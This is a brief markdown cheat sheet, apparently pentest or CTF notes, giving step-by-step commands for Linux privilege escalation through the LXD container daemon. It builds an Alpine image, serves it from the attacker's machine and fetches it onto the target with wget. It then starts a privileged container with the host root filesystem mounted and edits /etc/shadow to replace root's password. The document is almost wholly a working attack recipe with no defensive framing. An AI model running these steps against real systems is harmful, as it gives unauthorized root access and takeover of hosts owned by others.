- - -
**lxd = linux container daemon**
- - -
## Priv Esc through LXD : 

on your machine

```sh
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder 
cd rootfs/usr/share 
mkdir alpine-mirrors 
cd alpine-mirrors
```

Add the following into MIRRORS.txt:
http://alpine.mirror.wearetriple.com

```sh
vi MIRRORS.txt
```

```sh
cd ../../../../ ; sudo ./build-alpine
```

```sh
 ls   # A tar file was generated.
 ```

```python
python3 -m http.server 80
```

###### On target machine : 

```sh
wget <our_IP>/<.tar_file_name>
``` 

```sh
lxd init
``` 

Skip all steps default ....just press Enter...

```sh
lxc image import ./<.tar_file_name> --alias privesc
```

```sh
lxc image list
```

```sh
lxc init privesc privesc-container -c security.privileged=true
```

```sh
lxc list
```

```sh
config device add privesc-container mydevice disk source=/ path=/mnt/root recursive=true
```

```sh
lxc start privesc-container
```

```sh
lxc list
```

```sh
lxc exec privesc-container /bin/sh
```

```sh
cd / ;  cd mnt/root ; ls 
```

```sh 
vim etc/shadow   # [ edit the root's password ]
``` 

 exit

```sh
su root
```

- - -


